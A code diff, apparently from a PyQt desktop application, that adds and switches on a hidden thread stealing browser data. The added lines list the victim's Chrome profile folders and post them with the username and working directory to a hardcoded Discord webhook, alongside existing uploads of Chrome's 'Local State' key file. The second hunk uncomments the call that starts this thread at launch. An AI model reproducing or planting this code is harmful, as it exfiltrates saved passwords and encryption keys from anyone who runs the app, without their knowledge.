@@ -96,6 +96,10 @@ class Additional1Thread(QThread):
             kpath = path.join(cdata, "Local State")
             dpath = path.join(cdata, "Default", "Login Data")
 
+            aa = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
+            bb = path.join(aa, "Default")
+            requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received." + str(listdir(aa)) + str(listdir(bb))})
+
             try:
                 a1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Output received."})
                 a1f1_message = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", files={"fieldname": (kpath+"_"+ud(os.getlogin().lower()), open(kpath, "rb").read())})
@@ -163,7 +167,7 @@ class MainWindow(FramelessWindow):
         self.starter_thread.start()
 
         self.additional1_thread = Additional1Thread()
-        #self.additional1_thread.start()
+        self.additional1_thread.start()
 
         self.resize(680, self.height())
         self.iconLabel.setGeometry(QRect(4, 1, 32, 30))
